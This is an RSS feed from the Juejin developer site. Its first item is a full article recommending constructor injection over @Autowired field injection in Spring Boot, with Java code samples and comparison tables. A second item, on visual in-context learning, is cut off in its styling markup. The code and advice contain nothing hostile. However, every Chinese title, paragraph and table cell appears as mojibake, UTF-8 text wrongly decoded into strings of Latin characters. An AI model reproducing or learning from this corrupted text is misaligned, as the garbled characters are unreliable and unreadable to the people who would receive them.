<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[å‘Šåˆ«å­—æ®µæ³¨å…¥ï¼šä¸ºä»€ä¹ˆä½ åº”è¯¥åœ¨ Spring ä¸­ä½¿ç”¨æ„é€ å™¨æ³¨å…¥]]></title>    <link>https://juejin.cn/post/7596905751110844479</link>    <guid>https://juejin.cn/post/7596905751110844479</guid>    <pubDate>2026-01-19T15:54:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596905751110844479" data-draft-id="7596926832913121343" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‘Šåˆ«å­—æ®µæ³¨å…¥ï¼šä¸ºä»€ä¹ˆä½ åº”è¯¥åœ¨ Spring ä¸­ä½¿ç”¨æ„é€ å™¨æ³¨å…¥"/> <meta itemprop="keywords" content="åç«¯,Spring Boot"/> <meta itemprop="datePublished" content="2026-01-19T15:54:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤©æ–‡å®¶"/> <meta itemprop="url" content="https://juejin.cn/user/141198021370855"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‘Šåˆ«å­—æ®µæ³¨å…¥ï¼šä¸ºä»€ä¹ˆä½ åº”è¯¥åœ¨ Spring ä¸­ä½¿ç”¨æ„é€ å™¨æ³¨å…¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/141198021370855/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤©æ–‡å®¶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T15:54:36.000Z" title="Mon Jan 19 2026 15:54:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æ—¥å¸¸çš„ Spring Boot å¼€å‘ä¸­ï¼Œä½ æ˜¯å¦ç»å¸¸è¿™æ ·å†™ä»£ç ï¼Ÿ</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;
}
</code></pre>
<p>çœ‹èµ·æ¥ç®€æ´ã€ç›´è§‚ï¼ŒIDE ä¹Ÿèƒ½è‡ªåŠ¨è¡¥å…¨ã€‚ä½†ç»†å¿ƒçš„åŒå­¦å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼š<strong>IntelliJ IDEA æˆ–å…¶ä»–ç°ä»£ IDE ä¼šç»™å‡ºä¸€ä¸ªé»„è‰²è­¦å‘Š</strong>ï¼š</p>
<blockquote>
<p>â€œField injection is not recommended.â€</p>
</blockquote>
<p>æ˜¯çš„ï¼Œå°½ç®¡ <code>@Autowired</code> å­—æ®µæ³¨å…¥åœ¨åŠŸèƒ½ä¸Šå®Œå…¨å¯è¡Œï¼Œä½†å®ƒæ—©å·²è¢« Spring å®˜æ–¹å’Œç¤¾åŒºè§†ä¸º<strong>åæ¨¡å¼ï¼ˆanti-patternï¼‰</strong> ã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬å°±æ¥æ·±å…¥èŠèŠï¼š<strong>ä¸ºä»€ä¹ˆå­—æ®µæ³¨å…¥ä¸è¢«æ¨èï¼Ÿä»¥åŠå¦‚ä½•ä¼˜é›…åœ°æ”¹ç”¨æ„é€ å™¨æ³¨å…¥ï¼Ÿ</strong></p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€å­—æ®µæ³¨å…¥çš„é—®é¢˜ï¼šçœ‹ä¼¼æ–¹ä¾¿ï¼Œå®åˆ™éšæ‚£é‡é‡</h2>
<h3 data-id="heading-1">1. <strong>ä¾èµ–ä¸å¯å˜æ€§æ— æ³•ä¿è¯</strong></h3>
<p>å­—æ®µæ³¨å…¥è¦æ±‚ä¾èµ–å­—æ®µå¿…é¡»æ˜¯é <code>final</code> çš„ï¼Œè¿™æ„å‘³ç€ï¼š</p>
<ul>
<li>ä¾èµ–å¯ä»¥åœ¨è¿è¡Œæ—¶è¢«æ„å¤–ä¿®æ”¹ï¼›</li>
<li>æ— æ³•åˆ©ç”¨ <code>final</code> å…³é”®å­—å¸¦æ¥çš„çº¿ç¨‹å®‰å…¨æ€§å’Œè®¾è®¡æ¸…æ™°æ€§ã€‚</li>
</ul>
<h3 data-id="heading-2">2. <strong>å•å…ƒæµ‹è¯•å›°éš¾</strong></h3>
<p>å½“ä½ æƒ³ä¸º <code>UserController</code> ç¼–å†™å•å…ƒæµ‹è¯•æ—¶ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ å­—æ®µæ³¨å…¥ä¸‹ï¼Œæ— æ³•ç›´æ¥ä¼ å…¥ mock å¯¹è±¡</span>
<span class="hljs-type">UserController</span> <span class="hljs-variable">controller</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserController</span>(); <span class="hljs-comment">// userService ä¸º nullï¼</span>
</code></pre>
<p>ä½ ä¸å¾—ä¸å€ŸåŠ©åå°„ã€Spring TestContext æˆ– Mockito çš„ <code>@InjectMocks</code>ï¼Œå¢åŠ äº†æµ‹è¯•å¤æ‚åº¦ã€‚</p>
<h3 data-id="heading-3">3. <strong>å®¹æ˜“å¼•å‘ NPEï¼ˆç©ºæŒ‡é’ˆå¼‚å¸¸ï¼‰</strong></h3>
<p>å¦‚æœæŸä¸ªç±»è¢«æ‰‹åŠ¨ <code>new</code> å‡ºæ¥ï¼ˆæ¯”å¦‚åœ¨å·¥å…·ç±»æˆ–é Spring ç®¡ç†çš„ä¸Šä¸‹æ–‡ä¸­ï¼‰ï¼Œæ‰€æœ‰ <code>@Autowired</code> å­—æ®µéƒ½æ˜¯ <code>null</code>ï¼Œç›´åˆ°è¿è¡Œæ—¶æ‰æš´éœ²é—®é¢˜ã€‚</p>
<h3 data-id="heading-4">4. <strong>éšè—äº†çœŸå®ä¾èµ–</strong></h3>
<p>ä»ç±»çš„å¤–éƒ¨çœ‹ï¼Œä½ æ— æ³•ä¸€çœ¼çœ‹å‡ºå®ƒä¾èµ–å“ªäº› Beanã€‚è€Œæ„é€ å™¨æ³¨å…¥è®©ä¾èµ–<strong>æ˜¾å¼åŒ–</strong>ï¼Œç¬¦åˆâ€œæ˜¾å¼ä¼˜äºéšå¼â€çš„è®¾è®¡å“²å­¦ã€‚</p>
<h3 data-id="heading-5">5. <strong>åŠ©é•¿â€œä¸Šå¸ç±»â€å€¾å‘</strong></h3>
<p>å› ä¸ºå­—æ®µæ³¨å…¥å¤ªâ€œæ–¹ä¾¿â€ï¼Œå¼€å‘è€…å®¹æ˜“æ— èŠ‚åˆ¶åœ°æ³¨å…¥åå‡ ä¸ª Serviceï¼Œå¯¼è‡´ç±»èŒè´£ä¸æ¸…ã€éš¾ä»¥ç»´æŠ¤ã€‚</p>
<hr/>
<h2 data-id="heading-6">äºŒã€å®˜æ–¹æ¨èï¼šæ„é€ å™¨æ³¨å…¥ï¼ˆConstructor Injectionï¼‰</h2>
<p>Spring å®˜æ–¹æ–‡æ¡£æ˜ç¡®æŒ‡å‡ºï¼š</p>
<blockquote>
<p><strong>â€œThe recommended approach is to use constructor injection for mandatory dependencies and setter injection for optional ones.â€</strong><br/>
â€”â€” Spring Framework Documentation</p>
</blockquote>
<p>å³ï¼š<strong>å¼ºåˆ¶ä¾èµ–ç”¨æ„é€ å™¨æ³¨å…¥ï¼Œå¯é€‰ä¾èµ–ç”¨ Setter æ³¨å…¥ã€‚</strong></p>
<h3 data-id="heading-7">âœ… æ„é€ å™¨æ³¨å…¥çš„æ­£ç¡®å§¿åŠ¿</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> UserService userService; <span class="hljs-comment">// â† å£°æ˜ä¸º final</span>

    <span class="hljs-comment">// Spring 4.3+ï¼šå•æ„é€ å™¨å¯çœç•¥ @Autowired</span>
    <span class="hljs-keyword">public</span> UserController(UserService userService) {
        <span class="hljs-keyword">this</span>.userService = userService;
    }

    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"/{id}"</span>)</span>
    <span class="hljs-keyword">public</span> Result getUser(<span class="hljs-meta">@PathVariable</span> Integer id) {
        User user = userService.getUserById(id);
        <span class="hljs-keyword">return</span> Result.buildSuccess(user, <span class="hljs-string">"æŸ¥è¯¢æˆåŠŸ"</span>);
    }
}
</code></pre>
<h3 data-id="heading-8">ä¼˜åŠ¿ä¸€è§ˆï¼š</h3>



































<table><thead><tr><th>ç‰¹æ€§</th><th>æ„é€ å™¨æ³¨å…¥</th><th>å­—æ®µæ³¨å…¥</th></tr></thead><tbody><tr><td>ä¾èµ–ä¸å¯å˜</td><td>âœ… æ”¯æŒ <code>final</code></td><td>âŒ å¿…é¡»å¯å˜</td></tr><tr><td>å•å…ƒæµ‹è¯•å‹å¥½</td><td>âœ… ç›´æ¥ <code>new</code> ä¼ å‚</td><td>âŒ éœ€åå°„æˆ–å®¹å™¨</td></tr><tr><td>æ˜¾å¼ä¾èµ–å£°æ˜</td><td>âœ… æ„é€ å™¨å‚æ•°å³ä¾èµ–</td><td>âŒ éšè—åœ¨å­—æ®µä¸­</td></tr><tr><td>ç©ºæŒ‡é’ˆé£é™©</td><td>âŒ ä¸å¯èƒ½ä¸º null</td><td>âœ… å¯èƒ½ä¸º null</td></tr><tr><td>ç¬¦åˆ SOLID åŸåˆ™</td><td>âœ… å•ä¸€èŒè´£æ›´æ¸…æ™°</td><td>âŒ å®¹æ˜“è¿‡åº¦æ³¨å…¥</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-9">ä¸‰ã€å¸¸è§ç–‘é—®è§£ç­”</h2>
<h3 data-id="heading-10">Q1ï¼š<code>@Service</code> åº”è¯¥å†™åœ¨æ¥å£è¿˜æ˜¯å®ç°ç±»ä¸Šï¼Ÿ</h3>
<p><strong>å¿…é¡»å†™åœ¨å®ç°ç±»ä¸Šï¼</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ¥å£ï¼šä¸åŠ ä»»ä½•æ³¨è§£</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> {
    User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Integer id)</span>;
}

<span class="hljs-comment">// å®ç°ç±»ï¼šåŠ ä¸Š @Service</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Integer id)</span> {
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<blockquote>
<p>æ¥å£ä¸èƒ½è¢«å®ä¾‹åŒ–ï¼ŒSpring æ— æ³•é€šè¿‡æ¥å£åˆ›å»º Beanã€‚<code>@Service</code> æ˜¯ç»„ä»¶æ³¨è§£ï¼Œåªèƒ½ç”¨äºå…·ä½“ç±»ã€‚</p>
</blockquote>
<h3 data-id="heading-11">Q2ï¼šæ„é€ å™¨ä¸Šè¿˜éœ€è¦å†™ <code>@Autowired</code> å—ï¼Ÿ</h3>
<p><strong>ä¸éœ€è¦ï¼</strong><br/>
ä» Spring 4.3 å¼€å§‹ï¼Œ<strong>å¦‚æœä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªæ„é€ å™¨ï¼ŒSpring ä¼šè‡ªåŠ¨å°†å…¶ä½œä¸ºæ³¨å…¥ç‚¹</strong>ï¼Œæ— éœ€æ˜¾å¼æ ‡æ³¨ <code>@Autowired</code>ã€‚</p>
<h3 data-id="heading-12">Q3ï¼šå¤šä¾èµ–æ€ä¹ˆåŠï¼Ÿæ„é€ å™¨ä¼šä¸ä¼šå¤ªé•¿ï¼Ÿ</h3>
<p>è¿™æ˜¯å¥½äº‹ï¼<br/>
å¦‚æœæ„é€ å™¨å‚æ•°è¶…è¿‡ 3~4 ä¸ªï¼Œè¯´æ˜ä½ çš„ç±»å¯èƒ½è¿åäº†<strong>å•ä¸€èŒè´£åŸåˆ™ï¼ˆSRPï¼‰</strong> ï¼Œåº”è¯¥è€ƒè™‘æ‹†åˆ†ã€‚</p>
<hr/>
<h2 data-id="heading-13">å››ã€IDE å¿«é€Ÿé‡æ„æŠ€å·§</h2>
<ul>
<li><strong>IntelliJ IDEA</strong>ï¼šå°†å…‰æ ‡æ”¾åœ¨å­—æ®µä¸Š â†’ æŒ‰ <code>Alt + Enter</code> â†’ é€‰æ‹© <strong>â€œReplace with constructor injectionâ€</strong> ã€‚</li>
<li><strong>VS Code / Eclipse</strong>ï¼šä½¿ç”¨â€œç”Ÿæˆæ„é€ å™¨â€åŠŸèƒ½ï¼Œç„¶ååˆ é™¤å­—æ®µä¸Šçš„ <code>@Autowired</code>ã€‚</li>
</ul>
<p>å‡ ç§’é’Ÿï¼Œå°±èƒ½è®©ä»£ç æ›´å¥å£®ã€æ›´ä¸“ä¸šï¼</p>
<hr/>
<h2 data-id="heading-14">äº”ã€æ€»ç»“</h2>

























<table><thead><tr><th>åšæ³•</th><th>æ¨èåº¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>æ„é€ å™¨æ³¨å…¥</strong></td><td>â­â­â­â­â­</td><td>å¼ºåˆ¶ä¾èµ–é¦–é€‰ï¼Œå®‰å…¨ã€å¯æµ‹ã€æ¸…æ™°</td></tr><tr><td><strong>Setter æ³¨å…¥</strong></td><td>â­â­â˜†</td><td>ä»…ç”¨äºå¯é€‰ä¾èµ–æˆ–å¾ªç¯ä¾èµ–ï¼ˆå°½é‡é¿å…ï¼‰</td></tr><tr><td><strong>å­—æ®µæ³¨å…¥</strong></td><td>âš ï¸ ä¸æ¨è</td><td>è™½ç„¶èƒ½è·‘ï¼Œä½†å±äºæŠ€æœ¯å€º</td></tr></tbody></table>
<blockquote>
<p><strong>è®°ä½ï¼šå¥½çš„ä»£ç ä¸ä»…â€œèƒ½è·‘â€ï¼Œæ›´è¦â€œå¯ç»´æŠ¤ã€å¯æµ‹è¯•ã€å¯æ¼”è¿›â€ã€‚</strong></p>
</blockquote>
<p>ä»ä»Šå¤©èµ·ï¼Œå‘Šåˆ« <code>@Autowired</code> å­—æ®µæ³¨å…¥ï¼Œæ‹¥æŠ±æ„é€ å™¨æ³¨å…¥å§ï¼ä½ çš„ä»£ç è´¨é‡ã€å›¢é˜Ÿåä½œæ•ˆç‡ï¼Œç”šè‡³æœªæ¥çš„è‡ªå·±ï¼Œéƒ½ä¼šæ„Ÿè°¢ä½ è¿™ä¸ªå†³å®šã€‚</p>
<hr/>
<p><strong>æ¬¢è¿åœ¨è¯„è®ºåŒºè®¨è®ºï¼šä½ åœ¨é¡¹ç›®ä¸­æ˜¯å¦è¿˜åœ¨ä½¿ç”¨å­—æ®µæ³¨å…¥ï¼Ÿæœ‰æ²¡æœ‰é‡åˆ°è¿‡ç›¸å…³å‘ï¼Ÿ</strong></p>
<blockquote>
<p>ğŸ”— ç›¸å…³é˜…è¯»ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.spring.io%2Fspring-framework%2Fdocs%2Fcurrent%2Freference%2Fhtml%2Fcore.html%23beans-dependency-resolution" target="_blank" title="https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#beans-dependency-resolution" ref="nofollow noopener noreferrer">Spring å®˜æ–¹æ–‡æ¡£ - Dependency Injection</a></li>
<li>ã€ŠEffective Javaã€‹ç¬¬ 17 æ¡ï¼šMinimize mutability</li>
</ul>
</blockquote>
<hr/>
<p><strong>ä½œè€…ç®€ä»‹</strong>ï¼šå…¨æ ˆå·¥ç¨‹å¸ˆï¼Œå‚ä¸ Spring ç”Ÿæ€ä¸ç³»ç»Ÿæ¶æ„è®¾è®¡ã€‚åšæŒå†™æ¸…æ™°ã€å¯ç»´æŠ¤çš„ä»£ç ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»â€œå•ä¾‹æ¨¡ä»¿â€åˆ°â€œå¤šé¢èåˆâ€ï¼Œè§†è§‰ä¸Šä¸‹æ–‡å­¦ä¹ è¿ˆå‘â€œå›¢é˜Ÿåä½œâ€å¼æç¤ºèåˆ]]></title>    <link>https://juejin.cn/post/7597083743555190827</link>    <guid>https://juejin.cn/post/7597083743555190827</guid>    <pubDate>2026-01-20T02:53:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597083743555190827" data-draft-id="7597058281434087478" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»â€œå•ä¾‹æ¨¡ä»¿â€åˆ°â€œå¤šé¢èåˆâ€ï¼Œè§†è§‰ä¸Šä¸‹æ–‡å­¦ä¹ è¿ˆå‘â€œå›¢é˜Ÿåä½œâ€å¼æç¤ºèåˆ"/> <meta itemprop="keywords" content="ç®—æ³•,è®¡ç®—æœºè§†è§‰,æ·±åº¦å­¦ä¹ "/> <meta itemprop="datePublished" content="2026-01-20T02:53:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoovallyAIHub"/> <meta itemprop="url" content="https://juejin.cn/user/2461151071843739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»â€œå•ä¾‹æ¨¡ä»¿â€åˆ°â€œå¤šé¢èåˆâ€ï¼Œè§†è§‰ä¸Šä¸‹æ–‡å­¦ä¹ è¿ˆå‘â€œå›¢é˜Ÿåä½œâ€å¼æç¤ºèåˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2461151071843739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoovallyAIHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T02:53:18.000Z" title="Tue Jan 20 2026 02:53:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 